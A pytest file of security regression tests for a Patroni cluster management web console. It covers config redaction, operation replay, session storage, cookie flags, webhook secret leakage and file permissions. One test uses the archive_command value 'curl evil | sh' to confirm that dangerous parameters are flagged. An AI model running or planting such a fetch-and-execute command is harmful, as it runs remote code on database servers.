"""Регрессионные тесты по итогам ревью безопасности."""
import sqlite3

import pytest
import requests

from conftest import PASSWORDS, raw_config
from sim import SimCluster
from patroni_console import config as cfgmod, dynconf
from patroni_console.notify import Notifier
from patroni_console.store import Store
from patroni_console.web import create_app


@pytest.fixture
def sim():
    s = SimCluster()
    s.config['postgresql'] = {'recovery_conf': {'primary_conninfo': 'password=TOPSECRET'},
                              'parameters': {'archive_command': 'cp %p /arch/%f'}}
    return s


@pytest.fixture
def app(config, sim):
    config.clusters['test'].etcd.endpoints = []
    a = create_app(config, patroni_session_factory=sim.session, ops_sync=True)
    a.testing = True
    return a


def login(app, user):
    c = app.test_client()
    r = c.post('/api/auth/login', json={'username': user, 'password': PASSWORDS[user]})
    c.csrf = r.get_json()['data']['csrf_token']
    return c


def test_viewer_sees_redacted_config_admin_sees_all(app):
    v = login(app, 'viewer').get('/api/clusters/test/config').get_json()['data']
    assert 'TOPSECRET' not in str(v) and v['postgresql']['parameters']['archive_command'] == '***'
    a = login(app, 'admin').get('/api/clusters/test/config').get_json()['data']
    assert 'TOPSECRET' in str(a)


def test_operator_cannot_replay_admin_operation_by_key(app):
    a = login(app, 'admin')
    a.post('/api/clusters/test/operations', headers={'X-CSRF-Token': a.csrf, 'Idempotency-Key': 'k-admin'},
           json={'kind': 'config', 'params': {'changes': {'ttl': 40}}, 'confirm': 'test'})
    o = login(app, 'oper')
    r = o.post('/api/clusters/test/operations', headers={'X-CSRF-Token': o.csrf, 'Idempotency-Key': 'k-admin'},
               json={'kind': 'config', 'params': {'changes': {'ttl': 40}}, 'confirm': 'test'})
    assert r.status_code == 403 and 'data' not in r.get_json()


def test_key_of_another_user_is_conflict(app):
    a = login(app, 'admin')
    a.post('/api/clusters/test/operations', headers={'X-CSRF-Token': a.csrf, 'Idempotency-Key': 'shared'},
           json={'kind': 'pause', 'params': {}, 'confirm': 'test', 'acknowledge_warnings': True})
    o = login(app, 'oper')
    r = o.post('/api/clusters/test/operations', headers={'X-CSRF-Token': o.csrf, 'Idempotency-Key': 'shared'},
               json={'kind': 'pause', 'params': {}, 'confirm': 'test', 'acknowledge_warnings': True})
    assert r.status_code == 409


def test_dangerous_param_needs_force():
    cks = dynconf.checks({'postgresql': {'parameters': {}}},
                         {'postgresql': {'parameters': {'archive_command': 'curl evil | sh'}}})
    assert ('force', 'dangerous_param') in {(c['level'], c['code']) for c in cks}


def test_throttled_login_does_not_grow_audit(app, config):
    c = app.test_client()
    for _ in range(30):
        c.post('/api/auth/login', json={'username': 'admin', 'password': 'wrong'})
    with sqlite3.connect(config.db_path) as db:
        n = db.execute("SELECT count(*) FROM audit WHERE action='login'").fetchone()[0]
    assert n <= 10


def test_session_id_not_stored_in_plaintext(app, config):
    c = app.test_client()
    c.post('/api/auth/login', json={'username': 'admin', 'password': PASSWORDS['admin']})
    sid = c.get_cookie('pc_session').value
    with sqlite3.connect(config.db_path) as db:
        ids = [r[0] for r in db.execute('SELECT id FROM sessions')]
    assert sid not in ids and len(ids) == 1


def test_hsts_and_body_limit(app):
    c = app.test_client()
    r = c.get('/healthz', base_url='https://console.local')
    assert r.headers['Strict-Transport-Security'].startswith('max-age=')
    r = c.post('/api/auth/login', data='x' * 70000, content_type='application/json')
    assert r.status_code == 413


def test_secure_cookie_uses_host_prefix(tmp_path, sim):
    cfg = cfgmod.parse(raw_config(web={'secret_key': '${PC_TEST_SECRET}', 'cookie_secure': True}))
    cfg.db_path = str(tmp_path / 's.db')
    a = create_app(cfg, patroni_session_factory=sim.session)
    r = a.test_client().post('/api/auth/login', base_url='https://console.local',
                             json={'username': 'admin', 'password': PASSWORDS['admin']})
    sc = r.headers['Set-Cookie']
    assert sc.startswith('__Host-pc_session=') and 'Secure' in sc and 'HttpOnly' in sc and 'SameSite=Strict' in sc


def test_webhook_secret_url_not_leaked(config, tmp_path, monkeypatch):
    raw = raw_config(notify=[{'type': 'webhook', 'name': 'slack', 'url': 'https://hooks.example/services/T0/B0/SECRETPATH'}])
    cfg = cfgmod.parse(raw)
    store = Store(str(tmp_path / 'n.db'))
    store.event_add('test', 'info', 'warning', 'x', 'x', channels=['slack'])

    class S:
        def post(self, url, **kw):
            raise requests.ConnectionError(f"Max retries exceeded with url: {url}")
    Notifier(store, cfg.channels, session_factory=S).drain()
    err = store.events_list('test')[0]['notifications'][0]['last_error']
    assert 'SECRETPATH' not in err and err


def test_db_file_is_private(config):
    import os
    import stat
    Store(config.db_path)
    assert stat.S_IMODE(os.stat(config.db_path).st_mode) == 0o600
